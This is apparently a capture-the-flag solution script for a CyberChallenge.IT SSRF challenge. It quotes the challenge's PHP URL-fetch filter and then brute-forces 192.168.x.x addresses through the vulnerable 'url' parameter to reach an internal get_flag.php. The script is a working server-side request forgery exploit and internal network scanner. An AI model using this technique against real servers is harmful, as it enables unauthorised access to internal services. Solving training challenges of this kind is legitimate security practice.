#!/usr/bin/env python3
import requests as r

url = 'http://ssrf3.challs.cyberchallenge.it/'

# The server is running on localhost, so we can use the loopback address
# to access the server's local file /get_flag.php
"""
header("Content-Security-Policy: default-src 'none'; style-src cdnjs.cloudflare.com");

/* Thank you stackoverflow <3 */
function cidr_match($ip, $range){
    list ($subnet, $bits) = explode('/', $range);
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnet &= $mask; // in case the supplied subnet was not correctly aligned
    return ($ip & $mask) == $subnet;
}

if(isset($_GET['url']) && !is_array($_GET['url'])){
    $url = $_GET['url'];
    if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
        die('Not a valid URL');
    }
    $parsed = parse_url($url);
    $host = $parsed['host'];
    if (!in_array($parsed['scheme'], ['http','https'])){
        die('Not a valid URL');
    }
    $true_ip = gethostbyname($host);
    if(cidr_match($true_ip, '127.0.0.1/8') || cidr_match($true_ip, '0.0.0.0/32')){
        die('Not a valid URL');
    }
    echo file_get_contents($url);
    return;
}
"""
while True:
    # brute force loopback address
    for j in range(256):
        for k in range(256):
            loopback = f'192.168.{j}.{k}'
            print(f'Trying {loopback}')
            response = r.get(
                url, params={'url': f'http://{loopback}/get_flag.php'})
            if 'CCIT{' in response.text or 'flag{' in response.text:
                print(response.text)
                exit()
